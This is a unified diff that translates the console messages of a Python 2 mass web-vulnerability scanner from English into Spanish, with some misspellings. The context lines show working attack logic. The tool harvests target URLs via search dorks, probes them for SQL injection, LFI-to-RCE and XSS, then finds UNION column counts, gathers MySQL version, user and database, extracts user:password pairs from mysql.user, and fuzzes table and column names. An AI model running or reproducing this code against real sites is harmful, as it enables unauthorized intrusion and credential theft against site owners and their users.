@@ -172,7 +172,7 @@ def search(inurl, maxc):
     except(KeyboardInterrupt):
       pass
   tmplist = []
-  print "\n\n[+] URLS (unsorted): ",len(urls)
+  print "\n\n[+] URLS (Sin Clasificar): ",len(urls)
   for url in urls:
     try:
       host = url.split("/",3)
@@ -183,7 +183,7 @@ def search(inurl, maxc):
 	
     except:
       pass
-  print "[+] URLS (sorted)  : ",len(finallist)
+  print "[+] URLS (Clasificada)  : ",len(finallist)
   return finallist
  
   
@@ -261,7 +261,7 @@ def ClassicINJ(url):
                 source = urllib2.urlopen(host).read()
                 for type,eMSG in sqlerrors.items():
                         if re.search(eMSG, source):
-                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> SQL Injection Found"
+                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> Inyeccion SQL encontrada"
 				logfile.write("\n"+host)
 				vuln.append(host)
 				col.append(host)
@@ -282,7 +282,7 @@ def ClassicLFI(url):
     try:
       check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
       if re.findall("root:x", check):
-	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Local File Include Found"
+	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Arhchivos localaes Include encontrados"
 	lfi_log_file.write("\n"+lfiurl+lfi)
 	vuln.append(lfiurl+lfi)
 	target = lfiurl+lfi
@@ -294,7 +294,7 @@ def ClassicLFI(url):
 	  text = urllib2.urlopen(request_web)
 	  text = text.read()
 	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
-	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> LFI to RCE Found"
+	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> de LFI a RCE Encontrado"
 	    rce_log_file.write("\n",target)
 	    vuln.append(target)
         except:
@@ -308,7 +308,7 @@ def ClassicXSS(url):
     try:
       source = urllib2.urlopen(url+xss.replace("\n","")).read()
       if re.findall("XSS by sechacklabs", source):
-	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Found (might be false)"
+	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Encontrado (podria ser falso)"
 	xss_log_file.write("\n"+url+xss)
 	vuln.append(url+xss)
     except:
@@ -481,31 +481,31 @@ while menu == True:
     dorkk()
     thrreads()
     pagess()
-    print "\nNumber of SQL errors :",len(sqlerrors)
-    print "Number of LFI paths  :",len(lfis)
-    print "Number of XSS cheats :",len(xsses)
-    print "Number of headers    :",len(header)
-    print "Number of threads    :",numthreads
-    print "Number of pages      :",maxc
-    print "Timeout in seconds   :",timeout
+    print "\nNumeros de errores SQL         :",len(sqlerrors)
+    print "Numeros de parches LFI           :",len(lfis)
+    print "Numeros de cheats XSS            :",len(xsses)
+    print "Numeros de headers               :",len(header)
+    print "Numeros de threads               :",numthreads
+    print "Numeros de paginas               :",maxc
+    print "se acabo el tiempo en segundos   :",timeout
     print ""
   
     usearch = search(inurl,maxc)
     new = 0
   
-  print R+"\n[0] Exit"
+  print R+"\n[0] Salir"
   print "[1] SQLi Testing"
   print "[2] SQLi Testing Auto Mode"
   print "[3] LFI - RCE Testing"
   print "[4] XSS Testing"
-  print "[5] SQLi and LFI - RCE Testing"
-  print "[6] SQLi and XSS Testing"
-  print "[7] LFI - RCE and XSS Testing"
-  print "[8] SQLi,LFI - RCE and XSS Testing"
+  print "[5] SQLi y LFI - RCE Testing"
+  print "[6] SQLi y XSS Testing"
+  print "[7] LFI - RCE y XSS Testing"
+  print "[8] SQLi,LFI - RCE y XSS Testing"
   print "[9] Save valid urls to file"
-  print "[10] Print valid urls"
-  print "[11] Found vuln in last scan"
-  print "[12] New Scan\n"
+  print "[10] Mostrar URLS validas"
+  print "[11] Encontrar vulnerabilidades en el ultimo scan"
+  print "[12] Nuevo Scan\n"
   
   chce = raw_input(":")
   if chce == '1':
@@ -518,7 +518,7 @@ while menu == True:
     print "[!] Trabajando  ..."
     for host in col:
       print R+"\n[+] Target: ", O+host
-      print R+"[+] Attempting to find the number of columns ..."
+      print R+"[+] Intentando encontrar el número de columnas ..."
       print "[+] Testing: ",
       checkfor = []
       host = host.rsplit("'", 1)[0]
@@ -539,9 +539,9 @@ while menu == True:
 	  for y in checkfor:
 	    colFound = re.findall(y, source)
 	    if len(colFound) >= 1:
-	      print "\n[+] Column length is:", len(checkfor)
+	      print "\n[+] longitud de la columna es :", len(checkfor)
 	      nullcol = re.findall(("\d+"), y)
-	      print "[+] Found null column at column #:", nullcol[0]
+	      print "[+] Encontrado columna nula en la columna #:", nullcol[0]
 	      for z in xrange(0, len(checkfor)):
 		if z > 0:
 		  makepretty += ","
@@ -561,12 +561,12 @@ while menu == True:
 	except:
 	  pass
       
-      print "\n[!] Sorry column length could not be found\n"
+      print "\n[!] Lo sentimos la longitud de la columna no se pudo encontrar\n"
       
       
       #########
     
-    print B+"\n[+] Gathering MySQL Server Configuration..."
+    print B+"\n[+] Recopilacion de la configuracion de MYSQL Server..."
     for site in darkurl:
       head_URL = site.replace("sechacklabs", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
       print R+"\n[+] Target:", O+site
@@ -599,9 +599,9 @@ while menu == True:
 	    if re.findall("sechacklabs", source):
 	      print "\n[!] w00t!w00t!: "+site.replace("sechacklabs", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
 	  
-	  print W+"\n[+] Number of tables:",len(tables)
-	  print "[+] Number of columns:",len(columns)
-          print "[+] Checking for tables and columns..."
+	  print W+"\n[+] Numero de tablas:",len(tables)
+	  print "[+] Numero de columnas:",len(columns)
+          print "[+] Verificando por tablas y columnas..."
           target = site.replace("sechacklabs", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
 	  for table in tables:
             try:
@@ -616,19 +616,19 @@ while menu == True:
 		    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
 		    search = re.findall("sechacklabs", source)
 		    if len(search) > 0:
-		      print "\t[!] w00t!w00t! Found a column called: < "+column+" >"
+		      print "\t[!] w00t!w00t! Encontrada una clumna llamada: < "+column+" >"
 		  except(KeyboardInterrupt, SystemExit):
 		    raise
 		  except(urllib2.URLErrr, socket.gaierror, socket.error, socket.timeout):
 		    pass
 	    
-		print "\n[-] Done searching inside table < "+table+" > for columns!"
+		print "\n[-] Hecho! buscando dentro de la tabla < "+table+" > for columns!"
 	  
 	    except(KeyboardInterrupt, SystemExit):
 	      raise
 	    except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
 	      pass
-	  print "[!] Fuzzing is finished!"
+	  print "[!] Fuzzing está terminado!"
 	  break	  
 	except(KeyboardInterrupt, SystemExit):
 	  raise
@@ -661,30 +661,30 @@ while menu == True:
     xsstest()
     
   if chce == '9':
-    print B+"\nSaving valid urls ("+str(len(finallist))+") to file"
+    print B+"\nGuardando URLS validas ("+str(len(finallist))+") to file"
     listname = raw_input("Filename: ")
     list_name = open(listname, "w")
     finallist.sort()
     for t in finallist:
       list_name.write(t+"\n")
     list_name.close()
-    print "Urls saved, please check", listname
+    print "Urls guardadas, Porfavor verifica", listname
    
   if chce == '10':
-    print W+"\nPrinting valid urls:\n"
+    print W+"\nMostrando URLS validas:\n"
     finallist.sort()
     for t in finallist:
       print B+t
       
   if chce == '11':
-    print B+"\nVuln found ",len(vuln)
+    print B+"\nVuln encontrada ",len(vuln)
     
   if chce == '12':
     new = 1 
     print W+""
  
   if chce == '0':
-    print R+"\n[-] Exiting ..."
+    print R+"\n[-] Saliendo ..."
     mnu = False
     print W
     sys.exit(1)
